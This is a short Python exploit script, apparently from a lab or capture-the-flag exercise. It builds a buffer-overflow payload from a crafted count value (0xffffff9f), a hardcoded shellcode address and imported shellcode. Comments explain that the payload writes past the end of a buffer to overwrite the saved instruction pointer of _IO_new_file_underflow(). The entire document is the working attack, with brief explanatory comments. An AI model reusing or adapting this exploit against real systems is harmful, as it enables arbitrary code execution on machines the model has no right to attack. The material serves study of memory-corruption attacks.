import sys
import struct
from shellcode import shellcode

#shellcode
payload = shellcode
#number that will be read into count
start = struct.pack("<I", 0xffffff9f)
#address where shellcode starts
shellcodeAddr = struct.pack("<I", 0xbffeab04)
#basic idea is that you write so far past the end of the buffer
#that you start overwriting the instruction pointer in system
#level functions. In this code we overwrite the saved 
#eip of _IO_new_file_underflow() which fills the buffer
#using the read() system call
sys.stdout.buffer.write(start+shellcodeAddr+payload)
